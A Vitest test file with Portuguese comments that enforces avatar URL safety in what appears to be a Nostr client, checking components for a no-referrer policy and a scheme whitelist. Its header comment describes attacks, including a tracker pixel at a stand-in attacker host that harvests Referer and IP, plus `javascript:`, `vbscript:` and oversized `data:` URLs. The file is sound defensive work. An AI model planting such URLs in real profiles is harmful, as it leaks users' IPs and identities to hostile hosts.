// Avatar URL safety conformance — LOCK_VIA_TEST §28 (privacidade pelo mínimo).
//
// Source: Barney HIMYM adversarial audit 2026-05-17 (HIGH severity).
// Autor malicioso de evento kind 0 pode setar `metadata.picture` pra:
//   - Tracker pixel `https://attacker.com/pixel?npub=…` colhe Referer + IP
//   - `javascript:` URL (mitigado por React 18, mas defense em profundidade)
//   - `data:image/...` gigante = DoS render
//   - schemes desconhecidos (file://, vbscript:) = ataque potencial
//
// Defesas obrigatórias:
//   1. Scheme whitelist: aceitar só `https://` + `data:image/`
//   2. `referrerPolicy="no-referrer"` em qualquer <img src={metadata.picture}>
//      (evita vazamento de Referer pra origem hostil)
//   3. `loading="lazy"` pra reduzir DoS de avatares enormes
//
// Whitelist (false positives intencionais): `// avatar-audit: ok reason=...`

import { describe, it, expect } from 'vitest'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join } from 'node:path'

function walk(dir: string, acc: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    const full = join(dir, name)
    const st = statSync(full)
    if (st.isDirectory()) walk(full, acc)
    else if (full.endsWith('.tsx')) acc.push(full.replace(/\\/g, '/'))
  }
  return acc
}

describe('Avatar URL safety — manifesto §28 + Barney audit', () => {
  it('<img src={metadata.picture}> sempre tem referrerPolicy="no-referrer"', () => {
    const violations: string[] = []
    for (const file of walk('src/components')) {
      const content = readFileSync(file, 'utf8')
      // Heurística: tag <img> que referencia .picture de metadata
      const lines = content.split('\n')
      for (let i = 0; i < lines.length; i++) {
        const line = lines[i]
        if (!line) continue
        // Match apenas src= ATRIBUTO JSX que referencia picture (excluir docstrings)
        if (!/src=\{[^}]*\.picture[^}]*\}|src=\{[^}]*picture[^}]*\}/.test(line)) continue
        // Whitelist
        const prev = lines[i - 1] ?? ''
        if (/\/\/\s*avatar-audit:\s*ok/.test(prev) || /\/\/\s*avatar-audit:\s*ok/.test(line)) continue
        // Procura referrerPolicy num raio de 8 linhas (JSX prop pode estar
        // espalhada em multi-line)
        const block = lines.slice(Math.max(0, i - 4), Math.min(lines.length, i + 8)).join('\n')
        if (!/referrerPolicy=["']no-referrer["']/.test(block)) {
          violations.push(`${file}:${i + 1} — <img picture> sem referrerPolicy="no-referrer"`)
        }
      }
    }
    expect(
      violations,
      `\n${violations.join('\n')}\nFix: adicionar referrerPolicy="no-referrer" em <img src={metadata.picture}>`,
    ).toEqual([])
  })

  it('ProfileModal exporta isSafeAvatarUrl que rejeita schemes não-https/data:image', async () => {
    // Smoke: importa fn pure se exportada (defensa em profundidade)
    const content = readFileSync('src/components/Profile/ProfileModal.tsx', 'utf8')
    expect(content).toMatch(/isSafeAvatarUrl/)
    // Whitelist deve mencionar https + data:image
    expect(content).toMatch(/https:\/\//i)
    expect(content).toMatch(/data:image\//i)
  })
})
